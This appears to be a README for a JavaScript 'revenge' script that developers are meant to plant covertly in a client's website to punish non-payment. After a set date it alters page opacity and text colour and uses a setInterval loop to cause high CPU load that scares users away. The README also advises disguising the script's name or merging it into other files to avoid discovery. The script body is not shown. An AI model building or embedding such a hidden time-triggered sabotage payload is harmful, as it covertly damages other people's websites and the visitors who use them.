#### Are you tired of being cheated out of payments by clients and want to get revenge ??
#### this script can be embedded in a html page 

### rename the script to a more succint name or combine it with other javascript files to avoid glaring discovery
 ```html:
<script src="< PATH_TO_SCRIPT >"></script>
 ```

 ```javascript:
mustPayBy("2021-04-8", '2s');
 ```

 ### payloads
 this script will randomly change the page's opacity and also the pages text color. Since it uses setInterval ... if a small interval is set this will trigger high CPU usages scaring away the website users
